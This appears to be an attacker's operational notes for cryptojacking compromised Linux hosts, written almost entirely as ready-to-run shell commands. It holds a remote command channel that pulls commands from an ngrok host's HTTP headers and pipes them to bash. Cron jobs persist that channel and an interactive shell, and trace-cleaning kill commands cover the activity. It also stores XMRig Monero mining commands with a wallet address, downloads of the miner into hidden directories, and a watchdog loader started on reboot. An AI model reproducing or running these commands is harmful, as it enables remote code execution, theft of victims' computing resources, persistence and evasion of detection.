# USE FLASK SERVER TO EXEC CMD
curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash

# CLEAN & KILL THEN LEAVE
kill -9 $(lsof -t -i :443)
pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|script -q -c" # use when leave to clean trace

# CRON job
# Looks cryptic at a glance
*/1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null


# RIG
xmrig --url eu.hashvault.pro:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass zao --donate-level 0 --tls --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 50 --yield | -t 1 # this might be better than --cpu-max-threads-hint 50
nohup ./moktarr --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 > /dev/null 2>&1 &


# DOWNLOAD THE MINER BINARY & EXTRACT

curl -L -o xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz

wget -O xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf xmrig.tar.gz && rm -f xmrig.tar.gz


# Hide in sensible location
wget -O /dev/shm/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/xmrig.tar.gz && rm -f /dev/shm/xmrig.tar.gz
# straight launch
/dev/shm/.x/mok --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_333! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 75


# IF NO CURL OR WGET
perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz"); my $where = $ff->fetch(to => "/dev/shm/.x") or die $ff->error;'



# WHEN MANY PROCESS
# STEP 1 create javx.sh = LOADER

MINER_PATH="/tmp/.Test-unix/moktarr"
CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3"

LAST_REFRESH=$(date +%s)

while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED=$((CURRENT_TIME - LAST_REFRESH))

    if [ $ELAPSED -gt 43200 ]; then
        pkill -x xmrig
        LAST_REFRESH=$CURRENT_TIME
        sleep 5
    fi

    if ! pgrep -x "moktarr" > /dev/null; then
        $CMD > /dev/null 2>&1 &
    fi

    sleep 600
done

# STEP 2

#Make it executable: chmod +x javx.sh
#Add it to your User Crontab: Type crontab -e and add this single line at the bottom:  @reboot /bin/bash /tmp/.Test-unix/javx.sh

#How to use it:

#    Make it executable: chmod +x javx.sh
 #   Run it in the background: To keep it running even after you close your terminal, use screen (pre-installed on Ubuntu):
  #      Type screen to open a new session.
   #     Run the script: ./javx.sh
    #    Press Ctrl + A then D to detach.
    #The script is now the boss: It will check the miner every 5 minutes. If XMRig dies, the script starts it back up.
